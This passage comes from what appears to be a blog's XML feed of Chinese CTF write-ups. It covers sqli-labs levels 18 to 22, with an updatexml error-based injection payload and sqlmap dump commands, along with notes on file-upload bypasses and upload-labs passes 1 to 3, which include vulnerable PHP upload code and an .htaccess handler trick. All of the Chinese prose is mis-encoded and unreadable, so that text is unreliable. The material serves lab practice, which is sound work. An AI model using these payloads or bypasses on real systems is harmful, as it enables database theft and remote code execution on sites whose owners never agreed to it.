alt="image-20210208200520106"></p><p>è°·æ­Œçš„hackbarä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰ç‚¹é—®é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200534798.png" alt="image-20210208200534798"></p><p>ç›´æ¥ç”¨burpsuiteè¯•è¯•</p><p>payloadä¸º</p><pre class="line-numbers language-none"><code class="language-none">' or updatexml(1,concat(0x7e,(database())),1) or '1' = '1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å·²ç»çˆ†å‡ºæ¥äº†,æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ“ä½œå•¦</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200642152.png" alt="image-20210208200642152"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -r æŠ“åŒ…ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¾“å…¥æ­£ç¡®ä¼šæ˜¾ç¤ºReferer,é”™è¯¯æ²¡æœ‰æ˜¾ç¤º,è¿™é¢˜åŸºæœ¬ä¸Šå°±æ˜¯Refererè¿™é‡Œå­˜åœ¨æ³¨å…¥</p><p>å’Œ18é¢˜ä¸€æ ·,åªæ˜¯æ³¨å…¥ç‚¹ä¸ä¸€æ ·,ç”¨ä¸Šä¸€é¢˜çš„payloadå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200709726.png" alt="image-20210208200709726"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -r æŠ“åŒ…ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>æ‰‹åŠ¨</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200722575.png" alt="image-20210208200722575"></p><p>åŸºæœ¬ä¸Šå°±æ˜¯cookieæ³¨å…¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200801021.png" alt="image-20210208200801021"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200817248.png" alt="image-20210208200817248"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜ä¸€æ ·,å°±æ˜¯æŠŠpayloadç”¨base64ç¼–ç äº†</p><p>æŠŠä¸Šä¸€é¢˜çš„payload base64ç¼–ç ä¸€ä¸‹å°±æ˜¯è¿™é¢˜çš„payloadäº†</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r æŠ“åŒ…ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ --cookie uname=YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>æ‰‹åŠ¨</strong></p><p>å’Œä¸Šä¸€é¢˜çš„ä¸€æ ·,å°±æ˜¯æŠŠé—­åˆæ–¹å¼æ”¹æˆäº†åŒå¼•å·</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r æŠ“åŒ…ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ --cookie uname=YWRtaW4= --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
      <link href="2020/chang-jian-lou-dong/wen-jian-shang-chuan-lou-dong/"/>
      <url>2020/chang-jian-lou-dong/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†</h1><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚</p><h2 id="å¸¸è§æ–‡ä»¶ä¸Šä¼ æ£€æµ‹"><a href="#å¸¸è§æ–‡ä»¶ä¸Šä¼ æ£€æµ‹" class="headerlink" title="å¸¸è§æ–‡ä»¶ä¸Šä¼ æ£€æµ‹"></a>å¸¸è§æ–‡ä»¶ä¸Šä¼ æ£€æµ‹</h2><h3 id="1-å®¢æˆ·ç«¯jsæ£€æŸ¥"><a href="#1-å®¢æˆ·ç«¯jsæ£€æŸ¥" class="headerlink" title="1.å®¢æˆ·ç«¯jsæ£€æŸ¥"></a>1.å®¢æˆ·ç«¯jsæ£€æŸ¥</h3><p>jsä»£ç ä¸­åŠ äº†æ‹“å±•åçš„é»‘åå•é™åˆ¶ï¼Œé˜²æ­¢ä¸€èˆ¬ç”¨æˆ·ä¸Šä¼ ä¸è¢«å…è®¸çš„æ–‡ä»¶ã€‚</p><p>ç»•è¿‡æ–¹å¼ï¼š</p><p>1.burpsuiteæŠ“åŒ…ä¿®æ”¹</p><p>2.å‰ç«¯ä¿®æ”¹jsä»£ç </p><p>3.ç¦ç”¨æµè§ˆå™¨js</p><h3 id="2-æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡"><a href="#2-æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡" class="headerlink" title="2.æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡"></a>2.æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡</h3><h4 id="MIME-ç±»å‹æ£€æµ‹"><a href="#MIME-ç±»å‹æ£€æµ‹" class="headerlink" title="MIME ç±»å‹æ£€æµ‹"></a>MIME ç±»å‹æ£€æµ‹</h4><p>ä¸»è¦æ˜¯æ£€æµ‹Content-Type: å­—æ®µ</p><p>å°±æ˜¯æ£€æŸ¥Content-Typeçš„å€¼ï¼ŒMIMEç±»å‹å†³å®šäº†æŸç§æ‰©å±•åç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæ‰“å¼€ï¼ŒGIFçš„MIMEå€¼ä¸ºimage/gif</p><p>ç»•è¿‡æ–¹å¼ï¼š</p><p>burpæŠ“åŒ…ä¿®æ”¹Content-Type: ä¸ºå…è®¸çš„å­—æ®µ<br>Content-Type: image/gif<br>Content-Type: image/png<br>Content-Type: image/jpeg</p><h4 id="æ–‡ä»¶æ‹“å±•åæ£€æŸ¥"><a href="#æ–‡ä»¶æ‹“å±•åæ£€æŸ¥" class="headerlink" title="æ–‡ä»¶æ‹“å±•åæ£€æŸ¥"></a>æ–‡ä»¶æ‹“å±•åæ£€æŸ¥</h4><p>ä¸å‰ç«¯jsåç¼€åæ£€æµ‹ç±»ä¼¼ï¼Œåªä¸è¿‡æ˜¯åœ¨åç«¯è¿›è¡Œæ£€æŸ¥ï¼Œæœ‰æ—¶å€™è¿˜å¯ä»¥é…åˆè§£ææ¼æ´ç»“åˆç›®å½•è·¯å¾„æ”»å‡»ï¼Œä¾‹å¦‚test.asp/test.jpgã€‚åç«¯åç¼€åæ£€æŸ¥ä¹Ÿåˆ†ä¸¤ç§ï¼Œé»‘åå•ä¸ç™½åå•ã€‚</p><p>é»‘åå•æ£€æŸ¥ç»•è¿‡ï¼š</p><ul><li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼Œä¾‹ä»£ç ä¸­æœ‰phpè§„åˆ™ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨PHPæˆ–pHPç»•è¿‡ã€‚</li><li>é»‘åå•åˆ—è¡¨ç»•è¿‡ï¼Œå¯¹é»‘åå•åˆ—è¡¨ä¸­æ²¡æœ‰çš„æ‰©å±•åè¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚asaã€cerç­‰ã€‚</li><li>åˆ©ç”¨windowså’ŒLinuxç³»ç»Ÿçš„ç‰¹æ€§è¿›è¡Œç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼Œa.asp. a.asp_ç­‰ã€‚</li><li>htaccess æ–‡ä»¶æ”»å‡»ã€‚</li><li>é…åˆè§£ææ¼æ´(IISã€Apacheç­‰)ã€‚</li></ul><p>ç™½åå•ç»•è¿‡ï¼š</p><ul><li>æˆªæ–­æ”»å‡»ï¼Œæ¯”å¦‚a.asp%00.gifç­‰ã€‚</li><li>é…åˆè§£ææ¼æ´ã€‚</li></ul><h4 id="ç›®å½•è·¯å¾„çš„æ£€æŸ¥"><a href="#ç›®å½•è·¯å¾„çš„æ£€æŸ¥" class="headerlink" title="ç›®å½•è·¯å¾„çš„æ£€æŸ¥"></a>ç›®å½•è·¯å¾„çš„æ£€æŸ¥</h4><p>å¯¹ç›®å½•è·¯å¾„å¯è¿›è¡Œ0x00æˆªæ–­ç»•è¿‡ï¼›ä»¥åŠå¯ä»¥æ§åˆ¶ç›®å½•åœ°å€ï¼Œä¸Šä¼ æ–‡ä»¶å¤¹çš„å‚æ•°å¯æ§)</p><h4 id="æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«æ¶æ„ä»£ç "><a href="#æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«æ¶æ„ä»£ç " class="headerlink" title="æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«æ¶æ„ä»£ç "></a>æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«æ¶æ„ä»£ç </h4><p>è¿™ç§æ–¹å¼ä¸»è¦æ£€æŸ¥å›¾ç‰‡æ–‡ä»¶çš„å¹»æ•°ï¼Œæ¯”å¦‚GIFçš„å€¼ä¸ºGIF89aï¼Œåç«¯ä»£ç ä¼šæ£€æµ‹æ”¹å€¼åˆ¤æ–­æ˜¯å¦ä¸ºGIFå›¾ç‰‡æ–‡ä»¶ï¼Œæƒ³è¦ç»•è¿‡åªè¦åœ¨å¹»æ•°åé¢åŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±è¡Œã€‚</p><h4 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h4><p><strong>iisè§£ææ¼æ´</strong><br>1 ç›®å½•è§£æ<br>ä»¥*.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å°†ä¼šè¢«å½“æˆASPæ–‡ä»¶æ‰§è¡Œã€‚<br>2 æ–‡ä»¶è§£æ<br>*.asp;.jpg åƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨â€œï¼›â€åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ <em>.aspæ–‡ä»¶æ‰§è¡Œã€‚<br>IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ *.asa *.cer *.cdx<br>3 é»˜è®¤è§£æ<br>.asp .aspx .ashx .asa .cerè¿™æ˜¯ç³»ç»Ÿé»˜é»˜è®¤çš„åç¼€å<br>*</em>Apacheè§£ææ¼æ´**<br>Apache æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚xxx.php.rarå¯¹apacheæ¥è¯´raræ˜¯ä¸å¯è§£æçš„ï¼Œæ‰€ä»¥å°±ä¼šè§£ææˆxxx.php</p><p><strong>nginxè§£ææ¼æ´</strong><br>å¼€å¯cgi:SCRIPT_NAME FASTCGI:<br><a href="http://www.xx.com/a.jpg/.php(%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6)-----%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E4%B8%BA.php%E6%96%87%E4%BB%B6">www.xx.com/a.jpg/.php(ä»»ä½•ä¸å­˜åœ¨æ–‡ä»¶)-----å¯ä»¥è§£æä¸º.phpæ–‡ä»¶</a><br>a.jpg:<!--?php phpinfo();?--><br>a.php%00.jpgâ€”-è§£æä¸ºa.php</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="2020/ba-chang-xue-xi/upload-labs/"/>
      <url>2020/ba-chang-xue-xi/upload-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h2><h3 id="pass-01-js-audit"><a href="#pass-01-js-audit" class="headerlink" title="pass-01 js audit"></a>pass-01 js audit</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥åœ¨jsä¸Šæ·»åŠ phpæˆ–è€…ç¦ç”¨jsæˆ–è€…burpæ”¹åŒ…å°±å¥½äº†</p><h3 id="Pass-02-åªéªŒè¯Content-type"><a href="#Pass-02-åªéªŒè¯Content-type" class="headerlink" title="Pass-02 åªéªŒè¯Content-type"></a>Pass-02 åªéªŒè¯Content-type</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ“åŒ…æ”¹Content-Typeå³å¯ã€‚</p><h3 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03 é»‘åå•ç»•è¿‡"></a>Pass-03 é»‘åå•ç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¸å…è®¸ä¸Šä¼  .asp, .aspx, .php, .jspåç¼€æ–‡ä»¶ï¼Œä½†å¯ä»¥ä¸Šä¼ å…¶ä»–çš„åç¼€,å¦‚</p><pre class="line-numbers language-none"><code class="language-none">.phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰ææ˜¯ apache çš„ httpd.conf ä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ä¸Šä¼  .htaccess æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch "shell.jpg&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span 